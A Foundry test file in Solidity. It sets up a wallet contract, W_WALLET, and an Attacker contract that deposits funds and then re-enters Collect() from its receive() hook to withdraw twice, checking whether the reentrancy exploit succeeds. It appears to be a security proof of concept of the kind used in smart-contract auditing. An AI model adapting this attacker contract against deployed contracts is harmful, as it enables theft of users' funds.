
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {W_WALLET, Log} from "../src/W_WALLET.sol";

contract TestReentrancyW_WALLET is Test {
    W_WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new W_WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        // Minimum sum required by contract is 1 ether
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The attacker needs to have deposited funds first via Put()
        // This will be done in setupAttack

        // --- 3. Funding ---
        // Fund the victim contract with extra ETH (simulating other users' deposits)
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Warp time to pass the unlock time check
        vm.warp(block.timestamp + 1);
        
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    W_WALLET public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = W_WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds into the victim contract to satisfy the balance check
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialVictimBalance = address(victim).balance;
        uint256 initialAttackerBalance = address(this).balance;
        
        // 2. Store the value for the re-entrant call
        storedAttackVal = val;
        attackCallCount = 0;

        // 3. Call the vulnerable function
        victim.Collect(val);

        // 4. Verify Success Conditions
        // If we received more than we should have (due to reentrancy), the exploit succeeded
        uint256 finalAttackerBalance = address(this).balance;
        uint256 totalReceived = finalAttackerBalance - initialAttackerBalance;
        
        // The exploit is successful if we received more than our single deposit
        // or if we were able to call Collect multiple times
        if (totalReceived > val || attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {
            // Re-enter the contract - the balance hasn't been updated yet
            // so we can withdraw again
            if (address(victim).balance >= storedAttackVal) {
                victim.Collect(storedAttackVal);
            }
        }
    }
}
